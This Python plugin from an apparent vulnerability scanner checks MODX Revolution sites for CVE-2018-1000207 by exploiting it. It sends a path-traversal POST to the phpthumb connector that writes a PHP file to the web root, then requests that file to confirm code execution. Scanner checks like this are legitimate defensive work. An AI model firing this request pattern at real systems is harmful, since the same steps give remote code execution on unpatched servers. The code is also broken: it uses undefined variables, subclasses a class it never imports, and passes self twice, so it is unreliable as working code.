from cystack_scanner.core.controller.plugin import DetectorPlugin
from cystack_scanner.knowledge_base.data_container.http.url import URL
from cystack_scanner.knowledge_base.data_container.http.headers import HTTPHeaders
from cystack_scanner.misc.utils.logger import singleton_logger as core_logger



class cve_2018_1000207(InfrastructurePlugin):
	"""
	Detect CVE-2018-1000207 (Modx Revolution < 2.6.4 - Remote Code Execution)
	"""
	NAME = "CVE-2018-1000207"
	CS_VULN_TEMPLATE_ID = "2000031"
	RESOURCE_TYPES = [ URL ]

	CHECK_URL1 = '/connectors/system/phpthumb.php'
	CHECK_URL2 = '/assets/components/gallery/connector.php'


	def attack(self,url):
		verify = True
		code = '<?php echo md5(\'a2u\'); unlink($_SERVER[\'SCRIPT_FILENAME\']);?>'
		check_url = url.join(self.CHECK_URL1)
		http_request = self.create_http_request(url=check_url)
		http_response = self.requester.http.send(request=http_request,verify=verify)

		if http_response.status_code != 404:
	
			payload = {
				'ctx': 'web',
				'cache_filename': '../../payload.php',
				'useRawIMoutput': '1',
				'src': '.',
				'IMresizedData': code,
				'config_prefer_imagemagick': '0'
			}
	
			req = self.requester.http.send(request=http_request,method="POST", data=payload, verify=verify)
			check = self.requester.http.send(url=url + '/payload.php', verify=verify)
			
			if check.get_body() == '9bdc11de19fd93975bf9c9ec3dd7292d':
				return True

		check_url = url.join(self.CHECK_URL2)
		http_request = self.create_http_request(url=check_url)
		http_response = self.requester.http.send(url=check_url, verify=verify)

		if http_response.status_code !=404:

			payload ={
				'action': 'web/phpthumb',
				'f': 'php',
				'useRawIMoutput': '1',
				'IMresizedData': 'Ok',
				'config_prefer_imagemagick': '0'
			}

			req = self.requester.http.send(url=check_url,method="POST",data=payload, verify=verify)
			if r.text == "Ok":
				return True
	
		return False

	def detect(self, url):
		if self.attack(self,url):
			attributes = {
			"base_url": str(request.url.get_full_domain_with_path()),
			"url": str(url)
			}
			traffics = [
			http_response.id

			]
			core_logger.info("Vulnerability is found: %s, URL=%r"%(self.get_name(),str(url)))
			self.save_vuln(traffics=traffics, attributes=attributes)
			self.save_attribute(web_technology=" ModxRevolution", base_url=base_url)
		






















